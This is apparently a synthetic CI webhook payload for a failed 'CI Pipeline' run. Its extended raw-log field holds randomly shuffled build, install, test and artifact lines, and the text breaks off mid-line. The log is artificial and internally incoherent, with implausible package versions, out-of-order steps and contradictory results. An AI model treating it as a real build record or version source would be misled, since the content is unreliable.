{
  "action": "completed",
  "workflow_run": {
    "id": 829,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "0da577f464018f7ef77611529d5d12376395a83a",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-20T12:00:34.497538Z",
    "updated_at": "2025-12-20T12:03:44.605197Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\nCache hit for key-7541\nCache hit for key-2426\nWARNING: prettier has known vulnerabilities\nInstalling express@3.13.0\nStep 5/10: Building\nCache hit for key-7619\nInstalling react@5.15.0\nInstalling prettier@3.8.0\nInstalling axios@4.7.0\nCompiling src/index.js...\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCache hit for key-6546\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-4521\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-9568\n  PASS: test_user_create (439ms)\nInstalling prettier@2.16.0\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nInstalling lodash@4.3.0\nArtifact uploaded: build.tar.gz (17MB)\nArtifact uploaded: build.tar.gz (29MB)\nInstalling react@1.14.0\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:34] WARN: Deprecated API usage\n\u2713 build completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-2467\nWARNING: axios has known vulnerabilities\n\u2713 build completed\n\u2713 lint completed\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-8956\nCache hit for key-3316\nCache hit for key-4569\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n  PASS: test_auth_login (208ms)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/index.js...\n[12:00:34] WARN: Deprecated API usage\n\u2713 test completed\n  PASS: test_auth_login (170ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (46MB)\nStep 3/10: Building\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\nInstalling express@4.14.0\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (10MB)\nStep 4/10: Building\n  PASS: test_db_connect (220ms)\n\u2713 build completed\nInstalling jest@4.2.0\nStep 2/10: Building\nInstalling eslint@1.3.0\n\u2713 build completed\n  PASS: test_cache_hit (19ms)\nInstalling express@5.1.0\n\u2713 build completed\n[12:00:34] WARN: Deprecated API usage\nStep 7/10: Building\nInstalling eslint@4.19.0\nCache hit for key-5189\nStep 1/10: Building\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (339ms)\nCache hit for key-4051\nArtifact uploaded: build.tar.gz (39MB)\nStep 1/10: Building\nException: ValueError\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\nCompiling src/main.py...\nCache hit for key-1966\nInstalling react@1.1.0\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nInstalling eslint@1.10.0\n  PASS: test_db_connect (482ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (16MB)\n[12:00:34] INFO: Processing request\nInstalling eslint@5.6.0\n[12:00:34] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 test completed\nStep 1/10: Building\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nStep 9/10: Building\nCompiling src/handler.rs...\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\n\u2713 build completed\n  PASS: test_db_connect (193ms)\nStep 4/10: Building\nCompiling src/service.java...\nCache hit for key-6030\n  PASS: test_auth_login (162ms)\n[12:00:34] ERROR: Connection failed\nCompiling src/index.js...\nInstalling react@3.5.0\nArtifact uploaded: build.tar.gz (14MB)\n\u2717 build failed with exit code 97\nCache hit for key-3786\nCompiling src/index.js...\nCompiling src/app.ts...\nStep 3/10: Building\nCache hit for key-5546\nCache hit for key-9452\nInstalling lodash@2.6.0\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\n\u2713 test completed\nCompiling src/handler.rs...\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 lint completed\nInstalling react@2.0.0\nCache hit for key-6346\n[12:00:34] INFO: Processing request\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:34] INFO: Processing request\nInstalling eslint@5.20.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\nWARNING: express has known vulnerabilities\nWARNING: react has known vulnerabilities\nInstalling react@2.7.0\nWARNING: axios has known vulnerabilities\nStep 5/10: Building\nCache hit for key-6151\nCache hit for key-1959\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nInstalling jest@2.12.0\n[12:00:34] INFO: Processing request\nWARNING: axios has known vulnerabilities\n\u2713 build completed\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nCache hit for key-4512\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:34] INFO: Processing request\nInstalling eslint@5.7.0\nCache hit for key-3436\nArtifact uploaded: build.tar.gz (47MB)\nWARNING: eslint has known vulnerabilities\n  PASS: test_cache_hit (71ms)\nStep 5/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nInstalling axios@1.13.0\nCache hit for key-8422\nStep 2/10: Building\nException: ValueError\n[12:00:34] INFO: Processing request\nCache hit for key-6136\nStep 8/10: Building\nInstalling express@3.6.0\nCompiling src/handler.rs...\nCache hit for key-2018\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (38MB)\nInstalling prettier@2.16.0\nCache hit for key-5815\n\u2713 lint completed\nInstalling jest@5.18.0\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:34] INFO: Processing request\n=== Step setup_node completed ===\n=== Step: save_cache ===\n  PASS: test_cache_hit (278ms)\nCache hit for key-3051\nCache hit for key-2054\nCache hit for key-4898\nInstalling eslint@4.20.0\n  PASS: test_db_connect (15ms)\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_user_create (24ms)\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-6217\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:34] WARN: Deprecated API usage\nStep 10/10: Building\nStep 7/10: Building\nInstalling webpack@3.0.0\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (37MB)\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_cache_hit (206ms)\nCompiling src/main.py...\nWARNING: webpack has known vulnerabilities\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (83ms)\n\u2713 lint completed\n  PASS: test_api_health (115ms)\nCompiling src/app.ts...\nCache hit for key-9354\n\u2713 test completed\nStep 8/10: Building\nStep 8/10: Building\n\u2713 build completed\n\u2713 test completed\nCache hit for key-4523\n[12:00:34] WARN: Deprecated API usage\nStep 3/10: Building\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_user_create (238ms)\nCompiling src/index.js...\nCache hit for key-5926\nStep 3/10: Building\nInstalling webpack@5.13.0\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (306ms)\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nInstalling jest@2.15.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\n  PASS: test_cache_hit (215ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 test completed\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_db_connect (414ms)\n[12:00:34] INFO: Processing request\nInstalling axios@2.0.0\n\u2713 test completed\nCache hit for key-9858\n[12:00:34] INFO: Processing request\nStep 8/10: Building\n  PASS: test_cache_hit (382ms)\nStep 4/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (245ms)\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 test completed\n[12:00:34] INFO: Processing request\nInstalling express@3.16.0\nCache hit for key-4616\nCache hit for key-4296\nCompiling src/handler.rs...\nCompiling src/index.js...\n[12:00:34] WARN: Deprecated API usage\nInstalling webpack@1.13.0\nArtifact uploaded: build.tar.gz (19MB)\nInstalling jest@4.9.0\n\u2713 lint completed\n\u2713 lint completed\nInstalling prettier@5.13.0\nCompiling src/utils.go...\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-1645\nCompiling src/handler.rs...\nStep 1/10: Building\nCompiling src/index.js...\nInstalling react@2.13.0\n[12:00:34] WARN: Deprecated API usage\nStep 5/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-1149\nCache hit for key-6774\nCache hit for key-7676\n\u2713 lint completed\n\u2713 test completed\n[12:00:34] INFO: Processing request\nInstalling react@3.1.0\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nStep 1/10: Building\nInstalling express@4.10.0\nStep 10/10: Building\nWARNING: express has known vulnerabilities\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (292ms)\nInstalling webpack@1.4.0\n  PASS: test_cache_hit (454ms)\nInstalling express@2.16.0\nCompiling src/main.py...\nInstalling lodash@2.0.0\nStep 2/10: Building\nCache hit for key-3465\n[12:00:34] INFO: Processing request\nInstalling react@3.8.0\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nInstalling prettier@1.7.0\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-9987\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_api_health (381ms)\n\u2713 build completed\nInstalling jest@4.9.0\nInstalling react@3.8.0\nArtifact uploaded: build.tar.gz (23MB)\nStep 1/10: Building\n  PASS: test_auth_login (49ms)\nCache hit for key-5188\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-3147\nArtifact uploaded: build.tar.gz (32MB)\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_db_connect (284ms)\nInstalling axios@2.17.0\nCache hit for key-3333\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-7085\nStep 2/10: Building\n  PASS: test_cache_hit (182ms)\nInstalling eslint@4.1.0\nStep 4/10: Building\nInstalling express@5.11.0\nStep 3/10: Building\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\nStep 4/10: Building\n\u2717 build failed with exit code 11\nInstalling jest@2.1.0\nCache hit for key-5760\n  PASS: test_auth_login (77ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:34] INFO: Processing request\n\u2713 test completed\nCache hit for key-4867\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nInstalling prettier@4.0.0\nStep 4/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (18MB)\nStep 1/10: Building\nCache hit for key-9269\nInstalling prettier@1.5.0\nCache hit for key-4128\nCache hit for key-1542\nInstalling axios@4.6.0\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (71ms)\nStep 10/10: Building\n  PASS: test_db_connect (131ms)\n  PASS: test_api_health (62ms)\n\u2713 lint completed\n  PASS: test_cache_hit (124ms)\nStep 3/10: Building\n=== Step save_cache completed ===\n=== Step: integration_tests ===\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\nCompiling src/service.java...\n[12:00:34] WARN: Deprecated API usage\nInstalling axios@1.1.0\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nCache hit for key-2039\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (332ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:34] WARN: Deprecated API usage\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-5599\n[12:00:34] WARN: Deprecated API usage\nInstalling express@2.6.0\nCompiling src/index.js...\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/handler.rs...\nException: RuntimeError\n\u2713 test completed\n\u2717 build failed with exit code 96\nStep 5/10: Building\nCompiling src/app.ts...\nCompiling src/index.js...\nCompiling src/handler.rs...\nFAILED: test_api_health\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nInstalling eslint@5.4.0\nCache hit for key-6522\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/app.ts...\nCompiling src/handler.rs...\nStep 4/10: Building\nCache hit for key-8509\n\u2713 build completed\nStep 7/10: Building\nInstalling express@3.15.0\nCompiling src/index.js...\nCache hit for key-9718\nStep 6/10: Building\n  PASS: test_cache_hit (339ms)\nInstalling lodash@4.1.0\nCompiling src/handler.rs...\nCompiling src/main.py...\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nCache hit for key-7720\nCompiling src/main.py...\nCache hit for key-1533\nStep 10/10: Building\n\u2713 lint completed\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nCache hit for key-3498\nStep 1/10: Building\nStep 9/10: Building\nCache hit for key-6520\nStep 2/10: Building\nInstalling lodash@3.9.0\nCache hit for key-5158\nCache hit for key-5058\nInstalling lodash@4.0.0\nStep 7/10: Building\nStep 10/10: Building\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/handler.rs...\nInstalling webpack@5.7.0\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nInstalling jest@5.2.0\n\u2713 test completed\n  PASS: test_auth_login (365ms)\nCompiling src/handler.rs...\nInstalling axios@2.10.0\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_db_connect (393ms)\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\nCache hit for key-2097\n\u2713 build completed\nCompiling src/handler.rs...\n\u2713 test completed\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\n  PASS: test_user_create (286ms)\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (284ms)\n\u2713 build completed\nCompiling src/app.ts...\nStep 1/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (48MB)\nInstalling jest@1.15.0\n[12:00:34] INFO: Processing request\nInstalling webpack@1.10.0\nCompiling src/handler.rs...\n  PASS: test_cache_hit (377ms)\nCompiling src/utils.go...\nCache hit for key-1876\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (182ms)\n  PASS: test_user_create (495ms)\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_user_create (139ms)\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:34] INFO: Processing request\nCache hit for key-5177\nStep 2/10: Building\nInstalling jest@3.18.0\n\u2713 build completed\nStep 6/10: Building\n  PASS: test_db_connect (24ms)\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 test completed\nInstalling express@3.1.0\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nCache hit for key-6568\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (58ms)\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nStep 4/10: Building\nStep 10/10: Building\n[12:00:34] INFO: Processing request\nCache hit for key-5282\nCache hit for key-9461\n\u2713 test completed\nStep 10/10: Building\nCompiling src/index.js...\n  PASS: test_db_connect (211ms)\nCompiling src/main.py...\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: react has known vulnerabilities\n  PASS: test_auth_login (133ms)\nInstalling eslint@2.3.0\n  PASS: test_user_create (194ms)\nCompiling src/service.java...\nInstalling react@5.2.0\n  PASS: test_db_connect (447ms)\nStep 2/10: Building\nInstalling eslint@1.11.0\nCache hit for key-2346\nCache hit for key-6632\n\u2713 test completed\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\nStep 10/10: Building\nCache hit for key-2747\nWARNING: jest has known vulnerabilities\nInstalling eslint@2.18.0\nCompiling src/index.js...\nCompiling src/utils.go...\n\u2713 build completed\n  PASS: test_user_create (21ms)\nArtifact uploaded: build.tar.gz (23MB)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/index.js...\n  PASS: test_cache_hit (68ms)\n  PASS: test_cache_hit (405ms)\nInstalling prettier@4.8.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/utils.go...\nInstalling eslint@3.0.0\n  PASS: test_auth_login (185ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n=== Step integration_tests completed ===\n=== Step: checkout ===\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nCache hit for key-2332\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_cache_hit (253ms)\nCompiling src/index.js...\n\u2713 lint completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_user_create (301ms)\nInstalling react@5.2.0\nInstalling jest@3.20.0\n[12:00:34] INFO: Processing request\nInstalling webpack@1.17.0\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 build completed\nCache hit for key-8673\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (28MB)\n\u2717 build failed with exit code 25\n\u2713 test completed\nStep 2/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\n\u2713 build completed\n  PASS: test_api_health (44ms)\n  PASS: test_auth_login (285ms)\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nInstalling react@5.11.0\n  PASS: test_auth_login (396ms)\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (141ms)\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (19MB)\nInstalling prettier@5.6.0\nInstalling eslint@5.2.0\n  PASS: test_user_create (350ms)\nInstalling webpack@2.5.0\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\n\u2713 build completed\nInstalling webpack@5.18.0\n  PASS: test_cache_hit (273ms)\n  PASS: test_auth_login (32ms)\n\u2713 lint completed\n  PASS: test_api_health (120ms)\n[12:00:34] INFO: Processing request\nCache hit for key-3596\nCompiling src/main.py...\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nInstalling axios@4.18.0\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:34] WARN: Deprecated API usage\n\u2713 build completed\nArtifact uploaded: build.tar.gz (27MB)\nInstalling jest@3.5.0\nCache hit for key-1659\nCompiling src/service.java...\nCache hit for key-4521\n  PASS: test_db_connect (38ms)\nCache hit for key-5497\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (2MB)\nWARNING: jest has known vulnerabilities\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (104ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\nInstalling jest@5.1.0\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-5710\nStep 3/10: Building\nCompiling src/index.js...\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (9MB)\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n\u2713 test completed\nCompiling src/service.java...\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-4140\nStep 10/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (230ms)\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:34] INFO: Processing request\nCache hit for key-1236\n\u2717 build failed with exit code 26\nCache hit for key-1216\n  PASS: test_auth_login (261ms)\nInstalling react@2.8.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:34] WARN: Deprecated API usage\nCompiling src/service.java...\n  PASS: test_db_connect (367ms)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (42MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\n[12:00:34] ERROR: Connection failed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (46MB)\nStep 7/10: Building\nCompiling src/service.java...\n  PASS: test_user_create (185ms)\n  PASS: test_user_create (16ms)\nCache hit for key-7012\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_api_health (337ms)\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 test completed\nInstalling webpack@5.12.0\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 10/10: Building\nWARNING: express has known vulnerabilities\nCompiling src/main.py...\nInstalling lodash@4.5.0\nCache hit for key-7165\n\u2717 build failed with exit code 103\nInstalling jest@3.16.0\nInstalling lodash@1.6.0\n[12:00:34] INFO: Processing request\nCache hit for key-1641\nStep 5/10: Building\nStep 9/10: Building\n\u2713 test completed\nStep 6/10: Building\nCache hit for key-9675\nArtifact uploaded: build.tar.gz (4MB)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (50MB)\nCache hit for key-7527\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_auth_login (37ms)\nInstalling eslint@1.6.0\nStep 8/10: Building\nInstalling lodash@1.0.0\nInstalling jest@2.19.0\nCompiling src/handler.rs...\n\u2713 build completed\nStep 6/10: Building\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-9076\n\u2713 build completed\n  PASS: test_db_connect (144ms)\n  PASS: test_auth_login (265ms)\nCache hit for key-2570\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_api_health (103ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\nInstalling axios@1.1.0\nArtifact uploaded: build.tar.gz (24MB)\nStep 7/10: Building\nCache hit for key-3238\n  PASS: test_api_health (171ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: webpack has known vulnerabilities\nInstalling lodash@3.8.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_user_create (37ms)\nCache hit for key-6084\nCompiling src/handler.rs...\nStep 4/10: Building\n  PASS: test_db_connect (67ms)\n  PASS: test_user_create (116ms)\n\u2713 test completed\n=== Step checkout completed ===\n=== Step: deploy_production ===\nCache hit for key-7361\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-1135\nCache hit for key-6414\nCompiling src/index.js...\n  PASS: test_db_connect (380ms)\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 test completed\nCache hit for key-3021\nInstalling eslint@3.1.0\nInstalling axios@3.19.0\nCache hit for key-5154\n  PASS: test_db_connect (309ms)\nCache hit for key-1988\n\u2713 build completed\nCache hit for key-9322\nInstalling axios@2.7.0\nArtifact uploaded: build.tar.gz (1MB)\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_cache_hit (488ms)\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\nStep 10/10: Building\nCompiling src/utils.go...\nCompiling src/index.js...\nCache hit for key-8415\nCompiling src/handler.rs...\nCache hit for key-7270\n  PASS: test_user_create (277ms)\nInstalling lodash@5.6.0\nCompiling src/app.ts...\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nInstalling jest@5.18.0\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/app.ts...\nInstalling lodash@5.18.0\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-1051\n  PASS: test_api_health (37ms)\n  PASS: test_db_connect (410ms)\n[12:00:34] INFO: Processing request\nCache hit for key-1451\nCache hit for key-4078\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: lodash has known vulnerabilities\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nFAILED: test_cache_hit\n  PASS: test_db_connect (63ms)\n  PASS: test_db_connect (325ms)\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/main.py...\nInstalling webpack@2.3.0\n\u2713 lint completed\nCompiling src/index.js...\n\u2713 build completed\nCache hit for key-3519\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_api_health (490ms)\nStep 1/10: Building\nInstalling axios@3.1.0\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_user_create (372ms)\nStep 9/10: Building\n  PASS: test_api_health (219ms)\n[12:00:34] INFO: Processing request\nCache hit for key-3552\n  PASS: test_auth_login (482ms)\nCompiling src/app.ts...\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_user_create (123ms)\nCompiling src/main.py...\nCache hit for key-4931\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (187ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (471ms)\nInstalling axios@3.6.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (3MB)\nStep 8/10: Building\nCache hit for key-6824\n\u2713 build completed\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nInstalling axios@5.18.0\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nStep 9/10: Building\n[12:00:34] INFO: Processing request\nInstalling webpack@5.7.0\nInstalling lodash@2.8.0\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_cache_hit (325ms)\nCache hit for key-7015\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_api_health (34ms)\nCache hit for key-3493\nArtifact uploaded: build.tar.gz (21MB)\nInstalling lodash@3.8.0\nInstalling react@3.7.0\nCompiling src/handler.rs...\nInstalling express@3.19.0\n[12:00:34] ERROR: Connection failed\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nStep 9/10: Building\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (299ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (10MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nStep 2/10: Building\nInstalling prettier@4.18.0\nCompiling src/handler.rs...\nStep 7/10: Building\nInstalling webpack@4.8.0\n[12:00:34] INFO: Processing request\nFAILED: test_auth_login\nInstalling webpack@1.10.0\nInstalling react@1.15.0\n[12:00:34] INFO: Processing request\n\u2713 build completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nWARNING: jest has known vulnerabilities\n[12:00:34] ERROR: Connection failed\nStep 6/10: Building\nCache hit for key-9252\nStep 6/10: Building\n\u2713 build completed\n\u2713 test completed\n\u2717 build failed with exit code 55\n\u2713 lint completed\n\u2713 lint completed\n  PASS: test_cache_hit (481ms)\nCache hit for key-4841\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 7/10: Building\n\u2713 lint completed\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (4MB)\nInstalling lodash@2.4.0\nInstalling eslint@5.4.0\n[12:00:34] INFO: Processing request\nInstalling react@3.4.0\nArtifact uploaded: 